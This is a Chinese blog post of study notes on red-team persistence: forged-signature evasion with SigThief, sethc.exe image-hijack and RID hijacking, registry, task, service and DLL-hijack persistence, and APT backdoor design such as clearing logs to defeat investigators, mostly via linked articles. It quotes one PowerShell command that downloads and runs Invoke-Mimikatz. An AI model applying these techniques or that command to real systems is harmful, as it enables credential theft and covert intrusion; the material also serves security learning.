<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="&#34;auto&#34;"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/img/favicon.png"><link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/img/favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="description" content="没有天生的大牛，更没有永远的菜鸟求知若饥 , 虚心若愚"><meta name="author" content="iceH"><meta name="keywords" content=""><title>红队攻防学习之权限维持 - iceH’s Blog</title><link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="/lib/hint/hint.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/css/gundongtiao.css# 滚动条颜色.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/css/shubiao.css# 鼠标指针.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/css/valine.css"><script id="fluid-configs">var Fluid=window.Fluid||{},CONFIG={hostname:"www.secice.cn",root:"/",version:"1.8.5",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1},toc:{enable:!0,headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:""},copy_btn:!0,image_zoom:{enable:!0},lazyload:{enable:!0,onlypost:!1},web_analytics:{enable:!1,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null}}}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="iceH’s Blog" type="application/atom+xml">
</head><body><header style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/">&nbsp;<strong>iceH's Blog</strong>&nbsp;</a> <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> 首页</a></li><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="iconfont icon-books"></i> 博文</a><div class="dropdown-menu" aria-labelledby="navbarDropdown"><a class="dropdown-item" href="/archives/"><i class="iconfont icon-archive-fill"></i> 归档 </a><a class="dropdown-item" href="/categories/"><i class="iconfont icon-category-fill"></i> 分类 </a><a class="dropdown-item" href="/tags/"><i class="iconfont icon-tags-fill"></i> 标签</a></div></li><li class="nav-item"><a class="nav-link" href="/playlist/"><i class="iconfont icon-music"></i> 音乐</a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> 关于</a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> 友链</a></li><li class="nav-item" id="search-btn"><a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a></li></ul></div></div></nav><div class="banner intro-2" id="background" parallax="true" style="background:url(https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/img/background1.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="page-header text-center fade-in-up"><span class="h2" id="subtitle" title="红队攻防学习之权限维持"></span><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2020-12-30 13:41" pubdate>2020年12月30日 下午</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 3.8k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 41 分钟</span></div></div></div></div></div></header><main><div class="container-fluid"><div class="row"><div class="d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-md"><div class="container nopadding-md" id="board-ctn"><div class="py-5" id="board"><article class="post-content mx-auto"><h1 style="display:none">红队攻防学习之权限维持</h1><div class="markdown-body"><h1 id="七、权限维持"><a href="#七、权限维持" class="headerlink" title="七、权限维持"></a>七、权限维持</h1><h2 id="7-1-操作系统后门"><a href="#7-1-操作系统后门" class="headerlink" title="7.1 操作系统后门"></a>7.1 操作系统后门</h2><h3 id="7-1-1-Linux"><a href="#7-1-1-Linux" class="headerlink" title="7.1.1 Linux"></a>7.1.1 Linux</h3><p>参考文章：<code>https://cloud.tencent.com/developer/article/1666643</code></p><hr><h3 id="7-1-2-Windows"><a href="#7-1-2-Windows" class="headerlink" title="7.1.2 Windows"></a>7.1.2 Windows</h3><h4 id="7-1-2-1-对抗权限长期把控-伪造无效签名"><a href="#7-1-2-1-对抗权限长期把控-伪造无效签名" class="headerlink" title="7.1.2.1 对抗权限长期把控-伪造无效签名"></a>7.1.2.1 对抗权限长期把控-伪造无效签名</h4><p>Github：<code>https://github.com/secretsquirrel/SigThief</code></p><p><strong>简介：</strong></p><p>在实战中，尤其是需要长期控制的目标，除免杀对抗安全软件以外，还需考虑人为无 意查看恶意文件，如数字签名是否拥有。而许多安全软件，又仅仅验证是否有签名，而非验 证签名是否有效。那么针对重要的目标，需要提前做多重对抗准备。</p><p>伪造无效签名payload：</p><pre><code class="hljs stylus">sigthief<span class="hljs-selector-class">.py</span> ‐<span class="hljs-selector-tag">i</span> 有签名的文件<span class="hljs-selector-class">.exe</span> ‐t 没签名的文件<span class="hljs-selector-class">.exe</span> ‐o 新的文件名<span class="hljs-selector-class">.exe</span></code></pre><p>许多安全软件，仅仅是验证是否有数字签名，而不确认是否有效</p><p>该原始python在伪造证书时，需要注意2点：</p><p>原始证书文件需要对应目标机的机器版本以及位数，如目标机是Windows 2003，那么需要原始带证书文件也为Windows 2003的文件。包括第三方文件。</p><p>伪造证书后，例：在Windows 2003 开启验安全验证后，双击无法运行，也无报 错，需要命令行下执行即可。</p><h4 id="7-1-2-2-常见windows持久控制总结"><a href="#7-1-2-2-常见windows持久控制总结" class="headerlink" title="7.1.2.2 常见windows持久控制总结"></a>7.1.2.2 常见windows持久控制总结</h4><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.sins7.cn<span class="hljs-regexp">/summary-of-windows-persistence-backdoor-for-intranet-penetration/</span>

https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">229209</span>.html</code></pre><hr><h4 id="7-1-2-3-Windows-RID劫持"><a href="#7-1-2-3-Windows-RID劫持" class="headerlink" title="7.1.2.3 Windows RID劫持"></a>7.1.2.3 Windows RID劫持</h4><p>Rid_Hijack模块是一个关于后渗透阶段用来维持权限的模块…利用</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2998</span>
https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">169925</span>.html</code></pre><hr><h4 id="7-1-2-4-Shift映像劫持后门新玩法"><a href="#7-1-2-4-Shift映像劫持后门新玩法" class="headerlink" title="7.1.2.4 Shift映像劫持后门新玩法"></a>7.1.2.4 Shift映像劫持后门新玩法</h4><p><strong>映像劫持简介</strong></p><p>映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。</p><p>映像劫持其实是Windows内设的用来调试程序的功能，但是现在却往往被病毒恶意利用。当用户双击对应的程序后，操作系统就会给外壳程序（例如“explorer.exe”）发布相应的指令，其中包含有执行程序的路径和文件名，然后由外壳程序来执行该程序。事实上在该过程中，Windows还会在注册表的上述路径中查询所有的映像劫持子键，如果存在和该程序名称完全相同的子键，就查询对应子健中包含的“Dubugger”键值名，并用其指定的程序路径来代替原始的程序，之后执行的是遭到“劫持”的虚假程序。</p><p><strong>简单测试</strong></p><p>映像劫持技术的利用，存在已久，这里再简单说明下：修改注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options下sethc.exe，添加一个Debugger字符值（REG_SZ），并且赋值为cmd.exe的执行路径为C:\windows\system32\cmd.exe</p><p>之后键入五下Shift执行sethc.exe程序时便会执行cmd.exe程序。</p><p><strong>映像劫持后门新玩法</strong></p><p>参考文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">98526538</span></code></pre><hr><h4 id="7-1-2-4-windows权限维持篇-注册表维权"><a href="#7-1-2-4-windows权限维持篇-注册表维权" class="headerlink" title="7.1.2.4 windows权限维持篇-注册表维权"></a>7.1.2.4 windows权限维持篇-注册表维权</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1553305</span>

https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/xiaozi/</span>p/<span class="hljs-number">11798030</span>.html ---Window权限维持（一）：注册表运行键</code></pre><p>书上的知识点很详细的介绍了，思路很清晰！！！</p><hr><h4 id="7-1-2-5-windows权限维持篇2-计划任务维权"><a href="#7-1-2-5-windows权限维持篇2-计划任务维权" class="headerlink" title="7.1.2.5 windows权限维持篇2-计划任务维权"></a>7.1.2.5 windows权限维持篇2-计划任务维权</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/xiaozi/</span>p/<span class="hljs-number">11797078</span>.html</code></pre><p>书上的知识点很详细的介绍了，思路很清晰！！！</p><hr><h4 id="7-1-2-6-windows-权限维持篇3-服务service维权"><a href="#7-1-2-6-windows-权限维持篇3-服务service维权" class="headerlink" title="7.1.2.6 windows 权限维持篇3-服务service维权"></a>7.1.2.6 windows 权限维持篇3-服务service维权</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/xiaozi/</span>p/<span class="hljs-number">11815957</span>.html</code></pre><p>书上的知识点很详细的介绍了，思路很清晰！！！<br>介绍了命令行方式添加服务、powershell形式添加服务、SharPersist添加服务进行、Metasploit服务维权模块进行权限维持讲解！！</p><hr><h2 id="7-2-第三方组件后门"><a href="#7-2-第三方组件后门" class="headerlink" title="7.2 第三方组件后门"></a>7.2 第三方组件后门</h2><p>开始Windows也简单介绍了…</p><h3 id="7-2-1-APT对抗（一）红蓝对抗关于后门对抗"><a href="#7-2-1-APT对抗（一）红蓝对抗关于后门对抗" class="headerlink" title="7.2.1 APT对抗（一）红蓝对抗关于后门对抗"></a>7.2.1 APT对抗（一）红蓝对抗关于后门对抗</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1497360</span></code></pre><h3 id="7-2-2-APT对抗（二）红蓝对抗关于后门对抗"><a href="#7-2-2-APT对抗（二）红蓝对抗关于后门对抗" class="headerlink" title="7.2.2 APT对抗（二）红蓝对抗关于后门对抗"></a>7.2.2 APT对抗（二）红蓝对抗关于后门对抗</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1497361</span></code></pre><hr><h3 id="7-2-3-APT对抗（三）红蓝对抗关于后门对抗"><a href="#7-2-3-APT对抗（三）红蓝对抗关于后门对抗" class="headerlink" title="7.2.3 APT对抗（三）红蓝对抗关于后门对抗"></a>7.2.3 APT对抗（三）红蓝对抗关于后门对抗</h3><p><strong>前者的话:</strong> 从第三季开始引入段子，让本枯燥的学术文章，也变得生动有趣。第二季的Demo遵循人性五条来设计，回忆这其中五条：</p><p><strong>1、攻击方与防御方的本质是什么?</strong></p><p>增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。</p><p><strong>2、安全公司的本质是什么?</strong></p><p>盈利、最小投入、最大产出</p><p><strong>3、安全公司产品的本质是什么?</strong></p><p>能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张,宽带不足等问题的客户）</p><p><strong>4、安全人员的本质是什么?</strong></p><p>赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。</p><p><strong>5、对接客户的本质是什么?</strong></p><p>对接客户也是某公司内安全工作的一员、与概念4相同。</p><p><strong>6、线索排查与反线索排查</strong></p><p>那么这个demo离可高级可持续性渗透后门还有一段距离，这里引入第六条<code>线索排查</code>与<code>反线索排查</code>,在第二季的dem中，它生成了一个名为 micropoor.的文件，如果经验丰富的安全人员可根据时间差来排查日记，demo的工作流程大致是这样的，打开 notepad++，生成 micropoor. txt，写入内容，关闭文件流。根据线索排查，定位到 notepad++，导致权限失控。</p><p>在线索排查概念中，这里要引入“ABC”类线索关联排查，当防御者在得到线索A，顺藤到B，最后排查到目标文件C，根据五条中的第一条，demo要考虑如何删除指定日志内容，以及其他操作。来阻止ABC类线索关联排查。</p><p><strong>不要思维固死在这是一个 notepad++后门的文章，它是一个面向类后门，面向的是可掌握源码编译的类后门。</strong></p><p>同样不要把思维固定死在demo中的例子，针对不同版本的NT系统，完全引用”powershell IEX(New-Object System.Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/clymb3r/Powershell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1%E2%80%99);Invoke-Mimikatz&quot;%E8%80%8C%E5%85%B3%E4%BA%8Ebypass">https://raw.githubusercontent.com/clymb3r/Powershell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1’);Invoke-Mimikatz&quot;而关于bypass</a> UAC，已经有成熟的源码。或发送至远程或是写在本地的图片里，不要让知识限制了后门的想象。这也正是第一季所说的：一个优秀的 Microdot是量身目标制定且一般不具备通用性的。一般不具备通用性。</p><p>观看目前文章的一共有2类人，一类攻击方，一类防守方。假设一个场景，现在摆在你面前有一台笔记本，并且这台笔记本有明确的后门，你的任务，排查后门。我想所有人都会排查注册表，服务，端口，进程等。因为这些具备通用性，也同样具备通用性排查手段。</p><p>临近文章结尾，第三次引用：在后门的进化对抗中，rootkit发生了变化，最大的改变是它的系统层次结构发生了变化。</p><hr><h3 id="7-2-4-APT对抗（四）红蓝对抗关于后门对抗"><a href="#7-2-4-APT对抗（四）红蓝对抗关于后门对抗" class="headerlink" title="7.2.4 APT对抗（四）红蓝对抗关于后门对抗"></a>7.2.4 APT对抗（四）红蓝对抗关于后门对抗</h3><p>第四季是一个过渡季，过渡后门在对抗升级中由传统后门，衍生成锁定目标的制定后门。</p><p>引用百度百科的“后门程序”的相关解释 ：</p><pre><code class="hljs xquery">https://baike.baidu.com/<span class="hljs-type">item</span>/<span class="hljs-meta">%E5</span><span class="hljs-meta">%90</span><span class="hljs-meta">%8E</span><span class="hljs-meta">%E9</span><span class="hljs-meta">%97</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%E7</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%8B</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%BA</span><span class="hljs-meta">%8F</span>/<span class="hljs-number">108154</span></code></pre><p>安全从业人员，其实至少一直在与传统后门对抗，比如最常见的webshell免杀与webshell过waf。应急中的样本取证查杀远控残留文件等。但是webshell，远控仅仅又是“backdoor”的其中一种。</p><p>这里按照上几季的风格继续引用几个概念，只有概念清晰，才能了解如何对抗。</p><p><strong>1：安全从业人员为什么要了解后门？</strong></p><p>防御是以市场为核心的，而不是以项目为核心。需要对抗的可能是黑产从业者的流量劫持相关后门，或者是政治黑客的高持续渗透权限把控后门等。</p><p><strong>2：攻击人员为什么要了解后门？</strong></p><p>随着对抗传统后门的产品越来越成熟，由特征查杀，到行为查杀，到态势感知。到大数据联合特征溯源锁定，如何反追踪，是一个非常值得思考的问题。</p><p><strong>3：后门与项目的关联是什么？</strong></p><p>某项目，被入侵，应急并加固解决，若干天后，再次被入侵依然篡改为某博彩。导致安全从业人员，客户之间的问题。</p><p><strong>4：后门与安全产品的关联是什么？</strong></p><p>某客户购买某安全产品套装，在实战中，一般由非重点关注服务器迂回渗透到核心服务器来跨过安全产品监控，得到相关权限后，后门起到越过安全产品。它会涉及对其他附属安全产品的影响。如客户质疑：为什么我都买了你们的套装，还被入侵。并且这还是第二次了。</p><p><strong>这里再一次引入百度百科的APT的主要特性：</strong></p><p>——潜伏性： 这些新型的攻击和威胁可能在用户环境中存在一年以上或更久，他们不断收集各种信息，直到收集到重要情报。而这些发动APT攻击的黑客目的往往不是为了在短时间内获利，而是把“被控主机”当成跳板，持续搜索，直到能彻底掌握所针对的目标人、事、物，所以这种APT攻击模式, 实质上是一种“恶意商业间谍威胁”。</p><p>——持续性： 由于APT攻击具有持续性甚至长达数年的特征，这让企业的管理人员无从察觉。在此期间，这种“持续性”体现在攻击者不断尝试的各种攻击手段，以及渗透到网络内部后长期蛰伏。</p><p>——锁定特定目标： 针对特定政府或企业，长期进行有计划性、组织性的窃取情报行为,针对被锁定对象寄送几可乱真的社交工程恶意邮件，如冒充客户的来信,取得在计算机植入恶意软件的第一个机会。</p><p>——安装远程控制工具： 攻击者建立一个类似僵尸网络Botnet的远程控制架构，攻击者会定期传送有潜在价值文件的副本给命令和控制服务器(C&amp;C Server)审查。将过滤后的敏感机密数据，利用加密的方式外传。</p><p><strong>一次针对特定对象，长期、有计划性渗透的本质是什么？</strong></p><p>窃取数据下载到本地，或者以此次渗透来达到变现目的。</p><p>一次具有针对性的渗透，绝对不单单是以渗透DMZ区为主，重要资料一般在内网服务器区（包括但不限制于数据库服务器，文件服务器，OA服务器），与内网办公区（包括但不限制于个人机，开发机，财务区）等。而往往这样的高级持续渗透，不能是一气呵成，需要一定时间内，来渗透到资料所在区域。而这里其中一个重要的环节就是对后门的要求 ，在渗透期间内（包括但不限制于一周到月甚至到年）以保持后续渗透。</p><p><strong>传统型的后门不在满足攻击者的需求，而传统型的木马后门， 大致可分为六代：</strong></p><p>第一代 ，是最原始的木马程序。主要是简单的密码窃取，通过电子邮件发送信息等，具备了木马最基本的功能。</p><p>第二代 ，在技术上有了很大的进步，冰河是中国木马的典型代表之一。</p><p>第三代 ，主要改进在数据传递技术方面，出现了ICMP等类型的木马，利用畸形报文传递数据，增加了杀毒软件查杀识别的难度。</p><p>第四代 ， 在进程隐藏方面有了很大改动，采用了内核插入式的嵌入方式，利用远程插入线程技术，嵌入DLL线程。或者挂接PSAPI，实现木马程序的隐藏，甚至在Windows NT/2000下，都达到了良好的隐藏效果。灰鸽子和蜜蜂大盗是比较出名的DLL木马。</p><p>第五代 ，驱动级木马。驱动级木马多数都使用了大量的Rootkit技术来达到在深度隐藏的效果，并深入到内核空间的，感染后针对杀毒软件和网络防火墙进行攻击，可将系统SSDT初始化，导致杀毒防火墙失去效应。有的驱动级木马可驻留BIOS，并且很难查杀。</p><p>第六代 ，随着身份认证UsbKey和杀毒软件主动防御的兴起，黏虫技术类型和特殊反显技术类型木马逐渐开始系统化。前者主要以盗取和篡改用户敏感信息为主，后者以动态口令和硬证书攻击为主。PassCopy和暗黑蜘蛛侠是这类木马的代表。</p><p>以远控举例，远控最开始生成的RAT功能一体化（包括但不限制于文件传输，命令执行等），后衍生成生成RAT支持插件式来达到最终目的。</p><p>以上的几代包括以上远控共同点，以独立服务或者独立进程，独立端口等来到达目的。难以对抗目前的反病毒反后门程序。那么传统型后门权限维持就不能满足目前的需求。</p><p>以第二季的demo举例，它无自己的进程，端口，服务，而是借助notepad++（非dll劫持）来生成php内存shell（这个过程相当于插件生成），并且无自启，当服务器重启后，继续等待管理员使用notepad++，它属于一个AB链后门，由A-notepad生成B-shell，以B-shell去完成其他工作。如果继续改进Demo，改造ABC链后门，A负责生成，B负责清理痕迹，C负责工作呢? 这是一个攻击者应该思考的问题。</p><p><strong>而后门的主要工作有2点 ：</strong></p><pre><code class="hljs plain">1、越过安全产品

2、维持持续渗透权限</code></pre><p>文章的结尾，这不是一个notepad++的后门介绍，它是一个demo，一个类后门 ，一个具有源码可控类的后门</p><hr><h3 id="7-2-5-dll劫持"><a href="#7-2-5-dll劫持" class="headerlink" title="7.2.5 dll劫持"></a>7.2.5 dll劫持</h3><p>书上介绍了-两种劫持方法剖析，目前没找到实例，书上讲得很好…</p><p>另外的dll劫持：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/h2zZhou/</span>p/<span class="hljs-number">8601375</span>.html

https:<span class="hljs-regexp">//</span>www.<span class="hljs-number">4</span>hou.com<span class="hljs-regexp">/posts/</span>PrJ4

https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">227824</span>.html</code></pre><hr><h3 id="7-2-6-APT对抗-红蓝对抗关于后门对抗（五-七）"><a href="#7-2-6-APT对抗-红蓝对抗关于后门对抗（五-七）" class="headerlink" title="7.2.6 APT对抗-红蓝对抗关于后门对抗（五~七）"></a>7.2.6 APT对抗-红蓝对抗关于后门对抗（五~七）</h3><p>详情见中册502页</p></div><hr><div><div class="post-metas mb-3"><div class="post-meta mr-3"><i class="iconfont icon-category"></i> <a class="hover-with-bg" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a class="hover-with-bg" href="/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a> <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/">渗透攻击红队百科全书</a></div></div><p class="note note-warning"><strong>本文作者: </strong><a href="/">iceH</a><br><strong>本文链接: </strong><a href="http://www.secice.cn/p/efc8f01a">http://www.secice.cn/p/efc8f01a</a><br><strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p><div class="post-prevnext row"><article class="post-prev col-6"><a href="/p/5a00e178"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">红队攻防学习之内网渗透基础</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/p/ad5b2fbd"><span class="hidden-mobile">红队攻防学习之权限提升</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article class="comments" id="comments"><div id="vcomments"></div><script type="text/javascript">Fluid.utils.waitElementVisible("vcomments",(function(){Fluid.utils.createScript("https://cdn.staticfile.org/valine/1.4.14/Valine.min.js",(function(){new Valine({el:"#vcomments",app_id:"MnjV8raNBztIVGGKiicFL3Sq-MdYXbMMI",app_key:"hS70MmgmzDqbMSkSAfkDe42h",placeholder:"留下你的小脚印吧...",path:window.location.pathname,avatar:"wavatar",meta:["nick","mail"],pageSize:"10",lang:"zh-CN",highlight:!1,recordIP:!1,serverURLs:""})}))}))</script><noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a></noscript></article></article></div></div></div><div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p><div class="toc-body" id="toc-body"></div></div></div></div></div><div class="col-lg-7 mx-auto nopadding-md"><div class="container custom post-custom mx-auto"><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/img/psb.gif" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:300px;height:150px"></div></div><a id="scroll-top-button" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer class="text-center mt-5 py-3"><div class="footer-content"><span>iceH</span> <i class="iconfont icon-love"></i> <span>一条啥也不会的咸鱼！</span></div></footer><script src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:200}),NProgress.start(),document.addEventListener("DOMContentLoaded",(function(){window.NProgress&&window.NProgress.inc()})),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js"></script><script src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js"></script><script src="/js/debouncer.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="/js/lazyload.js"></script><script src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js"></script><script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script><script src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js"></script><script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script><script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script><script>!function(t,i){(0,Fluid.plugins.typing)(i.getElementById("subtitle").title)}(window,document)</script><script src="/js/local-search.js"></script><script>document.querySelector("#local-search-input").onclick=function(){searchFunc("/local-search.xml","local-search-input","local-search-result"),this.onclick=null}</script><script src="//cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/js/qipao.js"></script><script src="//cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/js/jingtaisidai.js"></script><script src="//cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/js/dianjichuzi.js"></script><script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="/js/boot.js"></script></body></html>